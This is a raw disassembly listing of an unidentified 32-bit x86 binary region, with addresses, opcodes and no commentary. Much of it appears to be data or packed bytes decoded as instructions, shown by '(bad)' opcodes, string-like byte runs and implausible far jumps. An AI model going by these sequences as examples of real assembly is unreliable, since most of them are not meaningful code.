  413a70:	cmp    DWORD PTR [edi+0x7c],ecx
  413a73:	dec    edi
  413a74:	cmp    eax,0x334f5f4f
  413a79:	dec    edi
  413a7a:	cmp    cl,BYTE PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	push   ds
  413a7f:	mov    dl,0x1f
  413a81:	mov    bl,0xf
  413a83:	ret    
  413a84:	or     al,0xc0
  413a86:	jl     0x413a58
  413a88:	jge    0x413a5b
  413a8a:	aas    
  413a8b:	dec    edi
  413a8c:	ins    BYTE PTR es:[edi],dx
  413a8d:	dec    edi
  413a8e:	cmp    cl,BYTE PTR [edi+0x4e]
  413a91:	dec    edi
  413a92:	cmp    DWORD PTR [edi+0x6a],ecx
  413a95:	dec    edi
  413a96:	cmp    eax,0x304f4e4f
  413a9b:	dec    edi
  413a9c:	cmp    cl,BYTE PTR [edi+0x34]
  413a9f:	dec    edi
  413aa0:	push   ds
  413aa1:	ret    0xc31f
  413aa4:	psrlq  mm1,QWORD PTR [eax+edx*8]
  413aa8:	jl     0x413a8a
  413aaa:	jge    0x413a8d
  413aac:	aas    
  413aad:	dec    edi
  413aae:	ins    BYTE PTR es:[edi],dx
  413aaf:	dec    edi
  413ab0:	cmp    cl,BYTE PTR [edi+0x4e]
  413ab3:	dec    edi
  413ab4:	cmp    DWORD PTR [edi+0x6b],ecx
  413ab7:	dec    edi
  413ab8:	cmp    eax,0x304f484f
  413abd:	dec    edi
  413abe:	cmp    cl,BYTE PTR [edi+0x36]
  413ac1:	dec    edi
  413ac2:	push   ds
  413ac3:	rcr    BYTE PTR [edi],cl
  413ac5:	ror    DWORD PTR [edi],cl
  413ac7:	jecxz  0x413ad5
  413ac9:	loopne 0x413b47
  413acb:	lock jge 0x413abf
  413ace:	aas    
  413acf:	dec    edi
  413ad0:	imul   ecx,DWORD PTR [edi+0x3a],0x394f5f4f
  413ad7:	dec    edi
  413ad8:	dec    edx
  413ad9:	dec    edi
  413ada:	ds dec edi
  413adc:	cmp    cl,BYTE PTR [edi+0x3f]
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	loop   0x413b02
  413ae3:	jecxz  0x413af4
  413ae5:	repz or al,0xf0
  413ae8:	jl     0x413aea
  413aea:	jge    0x413aed
  413aec:	jl     0x413afe
  413aee:	jge    0x413b01
  413af0:	ds dec edi
  413af2:	jg     0x413b43
  413af4:	cmp    cl,BYTE PTR [edi+0x53]
  413af7:	dec    edi
  413af8:	cmp    BYTE PTR [edi+0x6a],cl
  413afb:	dec    edi
  413afc:	ds dec edi
  413afe:	dec    ecx
  413aff:	dec    edi
  413b00:	xor    ecx,DWORD PTR [edi+0x3a]
  413b03:	dec    edi
  413b04:	xor    DWORD PTR [edi+0x1e],ecx
  413b07:	add    bl,BYTE PTR [edi]
  413b09:	add    ecx,DWORD PTR [edi]
  413b0b:	adc    ecx,DWORD PTR [eax+edx*1]
  413b0e:	jl     0x413b30
  413b10:	jge    0x413b33
  413b12:	aas    
  413b13:	dec    edi
  413b14:	add    BYTE PTR [eax],al
  413b16:	sahf   
  413b17:	cmp    DWORD PTR [ecx+0x0],eax
  413b1a:	xchg   edx,eax
  413b1b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b1e:	call   0x413d:0xea00413b
  413b25:	add    BYTE PTR [esi+0x3d],cl
  413b28:	inc    ecx
  413b29:	add    dl,bl
  413b2b:	cmp    eax,0x3b7a0041
  413b30:	inc    ecx
  413b31:	add    BYTE PTR [esi+0x3b],bh
  413b34:	inc    ecx
  413b35:	add    dl,dl
  413b37:	cmp    eax,0x3be20041
  413b3c:	inc    ecx
  413b3d:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  413b44:	pushf  
  413b45:	clc    
  413b46:	xchg   esi,eax
  413b47:	cmp    eax,DWORD PTR [ecx+0x0]
  413b4a:	or     bh,BYTE PTR ds:0x3d1e0041
  413b50:	inc    ecx
  413b51:	add    BYTE PTR [edx],ch
  413b53:	cmp    eax,0x3d3a0041
  413b58:	inc    ecx
  413b59:	add    dh,cl
  413b5b:	cmp    eax,DWORD PTR [ecx+0x0]
  413b5e:	call   0x413b:0xee004139
  413b65:	add    dh,bl
  413b67:	cmp    eax,DWORD PTR [ecx+0x0]
  413b6a:	out    dx,al
  413b6b:	cmp    eax,0x85350041
  413b70:	pushf  
  413b71:	clc    
  413b72:	cwde   
  413b73:	or     edx,DWORD PTR [edi]
  413b75:	and    DWORD PTR [edx-0x64ffbec5],0x8f81161c
  413b7f:	or     eax,0x705
  413b84:	inc    eax
  413b85:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413b89:	fnstsw WORD PTR [ebx]
  413b8b:	ss inc ebx
  413b8d:	add    BYTE PTR [edx+0x68],dh
  413b90:	inc    ebp
  413b91:	inc    ecx
  413b92:	(bad)  
  413b93:	cli    
  413b94:	jne    0x413bf8
  413b96:	(bad)  
  413b97:	in     eax,dx
  413b98:	inc    BYTE PTR [edi]
  413b9a:	mov    esi,0x8a05a3fa
  413b9f:	cmp    eax,DWORD PTR [ecx+0x0]
  413ba2:	xor    al,0x95
  413ba4:	pushf  
  413ba5:	clc    
  413ba6:	xor    al,0x96
  413ba8:	pushf  
  413ba9:	clc    
  413baa:	cmp    edx,DWORD PTR [ebp-0x6ac50764]
  413bb0:	pushf  
  413bb1:	clc    
  413bb2:	cmp    DWORD PTR [ebp-0x6ac70764],edx
  413bb8:	pushf  
  413bb9:	clc    
  413bba:	aas    
  413bbb:	xchg   ebp,eax
  413bbc:	pushf  
  413bbd:	clc    
  413bbe:	ds xchg ebp,eax
  413bc0:	pushf  
  413bc1:	clc    
  413bc2:	cmp    eax,0x3cf89c95
  413bc7:	xchg   ebp,eax
  413bc8:	pushf  
  413bc9:	clc    
  413bca:	and    eax,0xe9f89c95
  413bcf:	stc    
  413bd0:	add    esp,DWORD PTR [eax-0x6e]
  413bd3:	cmp    DWORD PTR [ecx+0x0],eax
  413bd6:	push   ss
  413bd7:	add    DWORD PTR [ebx+0x0],eax
  413bda:	pop    ecx
  413bdb:	dec    ecx
  413bdc:	imul   si,WORD PTR ds:0x98f89c85,0xffe9
  413be4:	push   eax
  413be5:	pop    es
  413be6:	arpl   WORD PTR [edx],cx
  413be8:	add    BYTE PTR [eax],al
  413bea:	mov    ?,WORD PTR [ecx]
  413bec:	inc    ecx
  413bed:	add    BYTE PTR [edx+0xe040b],bl
	...
  413c23:	adc    BYTE PTR [eax+0x0],al
  413c26:	cmp    dl,BYTE PTR [ecx]
  413c28:	inc    ebx
  413c29:	add    BYTE PTR [eax],al
  413c2b:	add    BYTE PTR [eax],al
  413c2d:	add    BYTE PTR [eax+eax*1+0x46],al
  413c31:	add    BYTE PTR [ecx+0x0],ch
  413c34:	outs   dx,DWORD PTR ds:[esi]
  413c35:	add    BYTE PTR [edx+0x0],cl
  413c38:	dec    ecx
  413c39:	add    BYTE PTR [eax+eax*1+0x46],al
  413c3d:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c41:	add    BYTE PTR [ebp+0x0],dl
  413c44:	inc    esi
  413c45:	add    BYTE PTR [edi+0x0],cl
  413c48:	imul   eax,DWORD PTR [eax],0x6f
  413c4b:	add    BYTE PTR [edx+0x0],ch
  413c4e:	dec    ebx
  413c4f:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c53:	add    BYTE PTR [edx+0x0],ch
  413c56:	imul   eax,DWORD PTR [eax],0x46006f
  413c5c:	jo     0x413c5e
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	add    BYTE PTR [ebx+0x0],ch
  413c62:	ins    DWORD PTR es:[edi],dx
  413c63:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c67:	add    BYTE PTR [ebx+0x0],dh
  413c6a:	ins    BYTE PTR es:[edi],dx
  413c6b:	add    BYTE PTR [edx+0x0],ch
  413c6e:	data16 add BYTE PTR [edi+0x0],ah
  413c72:	imul   eax,DWORD PTR [eax],0x64006f
  413c78:	add    BYTE PTR [di+0x0],dh
  413c7c:	imul   eax,DWORD PTR [eax],0x69006a
  413c82:	outs   dx,DWORD PTR ds:[esi]
  413c83:	add    BYTE PTR [esi+0x0],ah
  413c86:	add    BYTE PTR fs:[ebp+0x0],dh
  413c8a:	push   0x0
  413c8c:	add    BYTE PTR [bp+0x0],ah
  413c90:	add    BYTE PTR fs:[eax],al
  413c93:	add    BYTE PTR [eax],al
  413c95:	add    BYTE PTR [ebx+ebp*2+0x6c],al
  413c99:	fs data16 jae 0x413cfe
  413c9d:	push   0x6f
  413c9f:	imul   esp,DWORD PTR [esi+0x64],0x73
  413ca3:	imul   esp,DWORD PTR [esi+0x67],0x6a
  413ca7:	fs addr16 fs pushw 0x6867
  413cae:	addr16 pushw 0x6667
  413cb3:	push   0x6667
  413cb8:	add    BYTE PTR [eax],al
  413cba:	add    BYTE PTR [eax],al
  413cbc:	add    BYTE PTR [eax],al
  413cbe:	dec    ebx
  413cbf:	dec    edx
  413cc0:	dec    edx
  413cc1:	dec    ebx
  413cc2:	inc    esp
  413cc3:	inc    esi
  413cc4:	push   0x6b
  413cc6:	ins    BYTE PTR es:[edi],dx
  413cc7:	dec    esp
  413cc8:	cmp    al,BYTE PTR [esi+eax*2+0x49]
  413ccc:	imul   ebp,DWORD PTR [edi+0x64],0x6b66696a
  413cd3:	fs jae 0x413d45
  413cd6:	imul   esp,DWORD PTR [edi+0x66],0x6f696469
  413cdd:	push   0x69
  413cdf:	outs   dx,DWORD PTR ds:[esi]
  413ce0:	dec    edx
  413ce1:	dec    edi
  413ce2:	inc    esp
  413ce3:	inc    esi
  413ce4:	ins    BYTE PTR es:[edi],dx
  413ce5:	imul   ebp,DWORD PTR [edx+0x66],0x6f
  413ce9:	imul   esp,DWORD PTR [ebx+esi*2+0x67],0x73666a6f
  413cf1:	imul   ebp,DWORD PTR fs:[si+0x66],0x64
  413cf7:	push   0x643b6c67
  413cfc:	push   0x6667
  413d01:	add    BYTE PTR [eax],al
  413d03:	add    BYTE PTR [eax],al
  413d05:	add    BYTE PTR [ebp+0x51004100],dh
  413d0b:	dec    edi
  413d0c:	pop    edi
  413d0d:	dec    edi
  413d0e:	dec    eax
  413d0f:	dec    edi
  413d10:	push   esp
  413d11:	dec    edi
  413d12:	pop    edi
  413d13:	dec    edi
  413d14:	push   esi
  413d15:	dec    edi
  413d16:	or     DWORD PTR [edi+0x8],ecx
  413d19:	dec    edi
  413d1a:	cmp    cl,BYTE PTR [edi+0x0]
  413d1d:	add    BYTE PTR [ebp+0x4f],bl
  413d20:	pop    esi
  413d21:	dec    edi
  413d22:	push   ebx
  413d23:	dec    edi
  413d24:	or     DWORD PTR [edi+0x8],ecx
  413d27:	dec    edi
  413d28:	cmp    cl,BYTE PTR [edi+0x4f]
  413d2b:	dec    edi
  413d2c:	dec    ecx
  413d2d:	dec    edi
  413d2e:	pop    edi
  413d2f:	dec    edi
  413d30:	dec    eax
  413d31:	dec    edi
  413d32:	or     DWORD PTR [edi+0x8],ecx
  413d35:	dec    edi
  413d36:	cmp    cl,BYTE PTR [edi+0x0]
  413d39:	add    BYTE PTR [ecx+0x4f],cl
  413d3c:	push   edx
  413d3d:	dec    edi
  413d3e:	push   esi
  413d3f:	dec    edi
  413d40:	dec    ebp
  413d41:	dec    edi
  413d42:	pop    ebx
  413d43:	dec    edi
  413d44:	dec    edx
  413d45:	dec    edi
  413d46:	push   ebx
  413d47:	dec    edi
  413d48:	cmp    cl,BYTE PTR [edi+0x0]
  413d4b:	add    BYTE PTR [eax],al
  413d4d:	add    BYTE PTR [esi+0x7d],ch
  413d50:	outs   dx,BYTE PTR ds:[esi]
  413d51:	lea    ebp,[esi-0x63]
  413d54:	outs   dx,BYTE PTR ds:[esi]
  413d55:	lods   eax,DWORD PTR ds:[esi]
  413d56:	outs   dx,BYTE PTR ds:[esi]
  413d57:	mov    ebp,0xdd6ecd6e
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	in     eax,dx
  413d5e:	outs   dx,BYTE PTR ds:[esi]
  413d5f:	std    
  413d60:	outs   dx,BYTE PTR ds:[esi]
  413d61:	or     eax,0x2d6e1d6e
  413d66:	outs   dx,BYTE PTR ds:[esi]
  413d67:	cmp    eax,0x6d6e5d6e
  413d6c:	outs   dx,BYTE PTR ds:[esi]
  413d6d:	jb     0x413ddd
  413d6f:	jae    0x413ddf
  413d71:	jo     0x413de1
  413d73:	jno    0x413de3
  413d75:	jbe    0x413de5
  413d77:	ja     0x413de7
  413d79:	je     0x413de9
  413d7b:	jne    0x413deb
  413d7d:	mov    ch,BYTE PTR [esi-0x75]
  413d80:	outs   dx,BYTE PTR ds:[esi]
  413d81:	mov    BYTE PTR [esi-0x77],ch
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    gs,WORD PTR [esi+0x7c]
  413d88:	pop    esi
  413d89:	jge    0x413dd9
  413d8b:	jge    0x413d4b
  413d8d:	jge    0x413deb
  413d8f:	(bad)  
  413d90:	jge    0x413e02
  413d92:	mov    ebp,0x79736eb1
  413d97:	bound  esp,QWORD PTR [edx+0x78265fc6]
  413d9d:	add    BYTE PTR [ebp+0x17],cl
  413da0:	mov    bl,0x56
  413da2:	mov    ebp,0x423742f4
  413da7:	jle    0x413d46
  413da9:	jno    0x413e0f
  413dab:	mov    cl,0x0
  413dad:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d0],0x40
  413db5:	xlat   BYTE PTR ds:[ebx]
  413db6:	aad    0x93
  413db8:	dec    esp
  413db9:	adc    esp,edx
  413dbb:	jge    0x413d88
  413dbd:	faddp  st(7),st
  413dbf:	leave  
  413dc0:	xchg   BYTE PTR [esi+0x1fa23214],ah
  413dc6:	pusha  
  413dc7:	icebp  
  413dc8:	push   esp
  413dc9:	(bad)  
  413dca:	aad    0x18
  413dcc:	aad    0x71
  413dce:	add    BYTE PTR [eax],al
  413dd0:	add    BYTE PTR [eax],al
  413dd2:	out    dx,eax
  413dd3:	(bad)  [ebx+0x7]
  413dd6:	jmp    0xc02f:0x4500413b
  413ddd:	and    bh,BYTE PTR [ecx+eiz*1+0x41]
  413de1:	add    BYTE PTR [esi+0x53],al
  413de4:	outs   dx,DWORD PTR ds:[esi]
  413de5:	push   ebx
  413de6:	cmp    BYTE PTR [ebx],0x41
  413de9:	add    dh,ah
  413deb:	cmp    eax,DWORD PTR [ecx+0x0]
  413dee:	(bad)  
  413def:	in     eax,dx
  413df0:	adc    al,BYTE PTR [edi]
	...
  413e12:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e19:	pop    ecx
  413e1a:	outs   dx,BYTE PTR ds:[esi]
  413e1b:	jbe    0x413e95
  413e1d:	jns    0x413e73
  413e1f:	push   ecx
  413e20:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  413e24:	je     0x413e87
  413e26:	inc    ebx
  413e27:	jo     0x413e9b
  413e29:	data16 jp 0x413e7e
  413e2c:	jp     0x413e86
  413e2e:	ins    BYTE PTR es:[edi],dx
  413e2f:	je     0x413ea0
  413e31:	jns    0x413ea1
  413e33:	popa   
  413e34:	push   esi
  413e35:	push   ebp
  413e36:	push   0x564476
	...
  413e4b:	add    BYTE PTR [eax],al
  413e4d:	add    BYTE PTR [eax+ecx*2+0x74],dl
  413e51:	dec    esp
  413e52:	push   ebx
  413e53:	jne    0x413ec0
  413e55:	popa   
  413e56:	jp     0x413eac
  413e58:	arpl   WORD PTR [ecx+0x4b],cx
  413e5b:	push   edx
  413e5c:	imul   ebp,DWORD PTR [eax+0x53],0x4746536f
  413e63:	push   0x66495949
  413e68:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413e6c:	push   esi
  413e6d:	jb     0x413ed7
  413e6f:	add    BYTE PTR [ebx+0x51],al
  413e72:	ins    BYTE PTR es:[edi],dx
  413e73:	pop    eax
  413e74:	ja     0x413ec3
  413e76:	je     0x413eee
  413e78:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  413e7c:	jb     0x413ef7
  413e7e:	inc    edi
  413e7f:	push   edi
  413e80:	push   esi
  413e81:	inc    edi
  413e82:	ins    BYTE PTR es:[edi],dx
  413e83:	inc    ecx
  413e84:	inc    edi
  413e85:	jae    0x413e87
  413e87:	add    BYTE PTR [edi+0x4a],dl
  413e8a:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  413e91:	popa   
  413e92:	push   edi
  413e93:	push   esi
  413e94:	add    BYTE PTR [eax],al
  413e96:	in     al,0xf5
  413e98:	jnp    0x413ee8
  413e9a:	jnp    0x413e6a
  413e9c:	cmc    
  413e9d:	(bad)  
  413e9e:	fcomp  DWORD PTR [esi+0x189b5414]
  413ea4:	int    0x31
  413ea6:	in     eax,dx
  413ea7:	into   
  413ea8:	add    BYTE PTR [eax],al
  413eaa:	pop    es
  413eab:	add    DWORD PTR [eax],eax
  413ead:	add    ah,ch
  413eaf:	push   ebx
  413eb0:	icebp  
  413eb1:	fsubr  QWORD PTR [ecx-0x1b]
  413eb4:	dec    edx
  413eb5:	push   edi
  413eb6:	dec    esp
  413eb7:	ret    
  413eb8:	xlat   BYTE PTR ds:[ebx]
  413eb9:	sti    
  413eba:	in     al,0x48
  413ebc:	test   al,0x17
  413ebe:	(bad)  
  413ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ec0:	pop    es
  413ec1:	ja     0x413e6f
  413ec3:	xchg   ebx,eax
  413ec4:	ins    DWORD PTR es:[edi],dx
  413ec5:	or     DWORD PTR [eax-0x22],0x4a
  413ec9:	cmp    BYTE PTR [ecx+0x69086f10],bh
  413ecf:	dec    ecx
  413ed0:	cs pop ecx
  413ed2:	jecxz  0x413f45
  413ed4:	cmp    dh,BYTE PTR [edi+0x24]
  413ed7:	fidivr WORD PTR [ebx+eiz*4]
  413eda:	xchg   ebx,eax
  413edb:	into   
  413edc:	adc    cl,ch
  413ede:	push   esi
  413edf:	pop    esp
  413ee0:	xchg   ebp,eax
  413ee1:	fimul  DWORD PTR [edx+0x6ad8e477]
  413ee7:	fdivr  DWORD PTR [edi+0x6a]
  413eea:	xchg   ebx,eax
  413eeb:	sbb    bl,dl
  413eed:	push   edi
  413eee:	ffreep st(1)
  413ef0:	stc    
  413ef1:	jo     0x413ed4
  413ef3:	mov    edx,0x50003925
  413ef8:	fist   DWORD PTR [edi-0xe4f0d74]
  413efe:	sub    ebx,DWORD PTR [esi+0x2f]
  413f01:	fisubr DWORD PTR ds:0xa21d47c7
  413f07:	imul   esi,DWORD PTR [ebx+0x5],0x2bcdee4e
  413f0e:	ins    DWORD PTR es:[edi],dx
  413f0f:	pop    esp
  413f10:	and    BYTE PTR [ebp+0xc],0x2e
  413f14:	ss aas 
  413f16:	mov    al,ds:0x4301d04d
  413f1b:	cmp    al,0x8
  413f1d:	cld    
  413f1e:	or     DWORD PTR [esp+eax*1-0x1],esi
  413f22:	and    ah,ch
  413f24:	and    DWORD PTR [ecx-0x26],eax
  413f27:	mov    ds:0x2c94388c,al
  413f2c:	jg     0x413f43
  413f2e:	add    BYTE PTR ds:0x8e871b3a,bh
  413f34:	pop    edi
  413f35:	sub    eax,0x2bb78c9f
  413f3a:	(bad)  
  413f3b:	rcl    DWORD PTR [edx+0x3e],1
  413f3e:	lahf   
  413f3f:	dec    edx
  413f40:	jae    0x413f74
  413f42:	sub    al,BYTE PTR [ebx-0x3e25dafa]
  413f48:	aas    
  413f49:	aam    0x4d
  413f4b:	sub    eax,DWORD PTR [ebx+0x15]
  413f4e:	sub    bh,BYTE PTR [edx-0x49dfb33a]
  413f54:	ret    
  413f55:	add    BYTE PTR [esi+0x2c],al
  413f58:	(bad)  
  413f59:	and    edi,esi
  413f5b:	adc    BYTE PTR [ecx+0x8cb87b1],al
  413f61:	pusha  
  413f62:	rcl    BYTE PTR [edx-0x6d],cl
  413f65:	sahf   
  413f66:	push   ds
  413f67:	sar    BYTE PTR [ebp+edx*8-0x7],cl
  413f6b:	mov    ebp,edx
  413f6d:	pop    ss
  413f6e:	or     dh,dh
  413f70:	mov    al,0x6f
  413f72:	jecxz  0x413f5c
  413f74:	jnp    0x413f50
  413f76:	icebp  
  413f77:	pop    ecx
  413f78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f79:	xor    al,0x84
  413f7b:	out    0x2f,eax
  413f7d:	gs scas eax,DWORD PTR es:[edi]
  413f7f:	mov    ecx,0x797cfda1
  413f84:	popa   
  413f85:	in     al,dx
  413f86:	imul   esp,DWORD PTR ds:0xc1f03c52,0xffffffb6
  413f8d:	pop    esi
  413f8e:	lea    ebx,[esi]
  413f90:	loope  0x413ff2
  413f92:	inc    ebp
  413f93:	rcl    BYTE PTR [esi+eiz*8],cl
  413f96:	mov    ds:0x9da16b70,al
  413f9b:	mov    ecx,0x67e79fa7
  413fa0:	mov    DWORD PTR [edi],ebx
  413fa2:	nop
  413fa3:	xor    al,dh
  413fa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fa6:	mov    edi,0x705e4440
  413fab:	push   eax
  413fac:	neg    DWORD PTR [edx]
  413fae:	inc    ebp
  413faf:	xchg   edi,eax
  413fb0:	rcl    DWORD PTR [esi],0xc1
  413fb3:	xchg   ebp,eax
  413fb4:	jmp    0x0:0x0
	...
  414013:	add    BYTE PTR [eax],al
  414015:	add    BYTE PTR [edx-0x26],bl
  414018:	push   esi
  414019:	pusha  
  41401a:	(bad)  
  41401b:	in     al,dx
  41401c:	jle    0x414018
  41401e:	mov    ch,0x80
  414020:	cmp    eax,0x83e1e6f9
  414025:	(bad)  
  414026:	hlt    
  414027:	iret   
  414028:	add    BYTE PTR [eax],al
  41402a:	pop    es
  41402b:	add    DWORD PTR [eax],eax
  41402d:	add    bl,ah
  41402f:	pop    ecx
  414030:	dec    esi
  414031:	mov    eax,0x1c14c53b
  414036:	(bad)  
  414037:	and    eax,0xc4a2a9b5
  41403c:	idiv   dh
  41403e:	ret    0xaea4
  414041:	push   edi
  414042:	aas    
  414043:	mov    dh,0xb1
  414045:	or     DWORD PTR [edx-0x4fc0e9e],edx
  41404b:	push   esp
  41404c:	out    0xfd,al
  41404e:	imul   ebp,edx,0x1f
  414051:	push   ebp
  414052:	dec    ebx
  414053:	jo     0x413ff8
  414055:	popa   
  414056:	xlat   BYTE PTR ds:[ebx]
  414057:	mov    ah,0x60
  414059:	sbb    eax,0x3c8e5025
  41405e:	mov    ebx,ebp
  414060:	cmp    DWORD PTR [eax+ecx*8+0x69],esi
  414064:	sub    al,0x85
  414066:	sub    BYTE PTR [eax],ch
  414068:	outs   dx,BYTE PTR ds:[esi]
  414069:	out    dx,al
  41406a:	ins    DWORD PTR es:[edi],dx
  41406b:	push   esi
  41406c:	int3   
  41406d:	dec    eax
  41406e:	sbb    al,0xec
  414070:	mov    ecx,0xfa5c7406
  414075:	inc    edx
  414076:	stos   BYTE PTR es:[edi],al
  414077:	out    0xab,al
  414079:	pusha  
  41407a:	inc    ebp
  41407b:	pop    esp
  41407c:	inc    edi
  41407d:	dec    edi
  41407e:	shr    DWORD PTR [ebp+ebp*4+0x4e],cl
  414082:	jg     0x414071
  414084:	or     DWORD PTR [ebx+ebp*1+0x7c],0x1d
  414089:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41408b:	clc    
  41408c:	adc    al,0xd7
  41408e:	jbe    0x41407b
  414090:	into   
  414091:	in     eax,0x37
  414093:	iret   
  414094:	call   0x32f9b946
  414099:	lds    eax,FWORD PTR [edi]
  41409b:	shr    ebx,1
  41409d:	pop    ds
  41409e:	jns    0x4140f5
  4140a0:	mov    cl,0x86
  4140a2:	inc    eax
  4140a3:	ret    
  4140a4:	sar    edi,0xf9
  4140a7:	test   eax,0xb41e277
  4140ac:	adc    edx,DWORD PTR [eax-0x58]
  4140af:	fs addr16 inc edi
  4140b2:	jnp    0x41406d
  4140b4:	ret    0x4343
  4140b7:	jmp    0xba0cf962
  4140bc:	gs inc ebp
  4140be:	adc    eax,0xdb6ae138
  4140c3:	popf   
  4140c4:	push   es
  4140c5:	dec    edi
  4140c6:	adc    eax,0x1dc585e8
  4140cb:	stc    
  4140cc:	add    eax,0xbc0b8af1
  4140d1:	cwde   
  4140d2:	xor    BYTE PTR [edx-0x4fd44255],bl
  4140d8:	ins    DWORD PTR es:[edi],dx
  4140d9:	cmp    al,0xc6
  4140db:	inc    eax
  4140dc:	jbe    0x414110
  4140de:	rol    bh,cl
  4140e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140e1:	(bad)  
  4140e2:	arpl   WORD PTR [ebp+0x5a],bx
  4140e5:	in     al,0xfc
  4140e7:	lods   eax,DWORD PTR ds:[esi]
  4140e8:	pop    eax
  4140e9:	(bad)  [edx+0x59d9b21f]
  4140ef:	hlt    
  4140f0:	clc    
  4140f1:	cwde   
  4140f2:	inc    eax
  4140f3:	pushf  
  4140f4:	add    BYTE PTR [edx-0x48cd1cb],ch
  4140fa:	dec    ecx
  4140fb:	inc    esi
  4140fc:	in     al,dx
  4140fd:	cli    
  4140fe:	adc    ebx,DWORD PTR [ebx]
  414100:	les    eax,FWORD PTR ss:[ecx]
  414103:	push   ebp
  414104:	xchg   ebx,eax
  414105:	mov    dl,0x89
  414107:	dec    edi
  414108:	(bad)  [eax]
  41410a:	(bad)  
  41410b:	mov    al,0xde
  41410d:	cmp    ebp,edx
  41410f:	fstp   DWORD PTR [ecx]
  414111:	pop    esp
  414112:	bound  eax,QWORD PTR ds:0x8477e901
  414118:	(bad)  [edx]
  41411a:	leave  
  41411b:	aaa    
  41411c:	add    eax,0x1ba9252c
  414121:	pop    ecx
  414122:	not    DWORD PTR [eax]
  414124:	dec    esp
  414125:	and    eax,0xca478c3d
  41412a:	pop    edx
  41412b:	ins    DWORD PTR es:[edi],dx
  41412c:	fsubr  st,st(2)
  41412e:	inc    ecx
  41412f:	push   ds
  414130:	daa    
  414131:	call   0x1276ac3
	...
  414196:	add    dl,BYTE PTR [edx]
  414198:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  41419e:	push   0xffffffdd
  4141a0:	add    eax,0xaaee52b4
  4141a5:	(bad)  
  4141a7:	rol    BYTE PTR [eax],1
  4141a9:	add    BYTE PTR [edi],al
  4141ab:	add    DWORD PTR [eax],eax
  4141ad:	add    BYTE PTR [edx+0x5a],dh
  4141b0:	mov    ebx,DWORD PTR [ebx]
  4141b2:	pop    ss
  4141b3:	cwde   
  4141b4:	xor    BYTE PTR [esi-0x28],dl
  4141b7:	xlat   BYTE PTR ds:[ebx]
  4141b8:	jae    0x414163
  4141ba:	mov    dl,BYTE PTR cs:[edi-0x32]
  4141be:	in     al,dx
  4141bf:	xor    BYTE PTR [eax+0x4e],0x33
  4141c3:	mov    dl,0xa7
  4141c5:	fisttp QWORD PTR [ebp+0xa767b39]
  4141cb:	cmp    DWORD PTR ds:0xd340e5d5,edi
  4141d1:	loopne 0x414251
  4141d3:	arpl   WORD PTR ds:0x68035dc2,cx
  4141d9:	or     cl,dl
  4141db:	sar    BYTE PTR [ebp-0x27],0xca
  4141df:	xor    DWORD PTR [ebx],esi
  4141e1:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4141e3:	xchg   esi,eax
  4141e4:	dec    BYTE PTR [edi+0x7e]
  4141e7:	cmp    dh,dh
  4141e9:	cdq    
  4141ea:	std    
  4141eb:	ror    DWORD PTR [edx+0x3938ecb9],1
  4141f1:	mov    ds:0x379634ae,eax
  4141f6:	push   es
  4141f7:	js     0x4141b1
  4141f9:	in     al,dx
  4141fa:	fcomp  st(3)
  4141fc:	imul   esp,ebx,0xffffff9c
  4141ff:	and    eax,0x2308c450
  414204:	xbegin 0x70fbb01
  41420a:	inc    edx
  41420b:	push   edx
  41420c:	lods   al,BYTE PTR ds:[esi]
  41420d:	aaa    
  41420e:	sbb    BYTE PTR [ebp-0x3d],dl
  414211:	(bad)  [eax-0x64803d63]
  414217:	mov    eax,0xbaf17651
  41421c:	xchg   edx,eax
  41421d:	jecxz  0x414220
  41421f:	cmp    BYTE PTR [ecx-0x3e],dl
  414222:	and    bh,BYTE PTR [eax]
  414224:	fsubr  QWORD PTR [edi-0x48]
  414227:	fmulp  st(4),st
  414229:	adc    DWORD PTR [edx],ebx
  41422b:	(bad)  
  41422c:	sahf   
  41422d:	inc    esi
  41422e:	sbb    eax,0x8968dbae
  414233:	cld    
  414234:	jecxz  0x414218
  414236:	inc    ecx
  414237:	lahf   
  414238:	xlat   BYTE PTR ds:[ebx]
  414239:	jno    0x414259
  41423b:	add    bl,dl
  41423d:	push   0xdb133e82
  414242:	cli    
  414243:	jns    0x41421b
  414245:	(bad)  
  414246:	jno    0x4141e8
  414248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414249:	ds out dx,eax
  41424b:	jno    0x41425b
  41424d:	xchg   ebp,eax
  41424e:	adc    dh,ah
  414250:	mov    eax,ds:0x84e5747d
  414255:	add    dh,BYTE PTR [esi+0x5bc0018b]
  41425b:	jo     0x4141f5
  41425d:	push   esp
  41425e:	mov    ah,0xbd
  414260:	inc    eax
  414261:	stos   BYTE PTR es:[edi],al
  414262:	cmp    eax,0x32a89cfe
  414267:	std    
  414268:	sub    eax,0x47d753ec
  41426d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41426e:	adc    al,0x0
  414270:	jg     0x4142a5
  414272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414273:	pop    es
  414274:	in     al,dx
  414275:	aaa    
  414276:	inc    ecx
  414277:	pop    edx
  414278:	xor    BYTE PTR [edi-0x712a8ed8],ch
  41427e:	lea    edi,[edi-0x2c]
  414281:	loop   0x4142cd
  414283:	call   0x34e8a63f
  414288:	inc    eax
